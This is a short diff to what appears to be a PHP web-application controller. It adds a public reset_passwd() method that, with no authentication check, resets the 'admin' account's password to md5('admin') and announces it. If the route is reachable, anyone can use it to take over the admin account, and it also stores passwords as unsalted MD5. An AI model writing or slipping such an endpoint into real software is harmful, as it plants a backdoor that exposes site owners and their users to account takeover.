@@ -329,4 +329,10 @@ pages/media/pages/earth.jpg";
 		*/
 		// echo $src_html;
 	}
+
+	public function reset_passwd()
+	{
+		$this->db->where('user_name','admin')->update('main_user',['password'=>md5('admin')]);
+		echo "your admin password is now admin";
+	}
 }
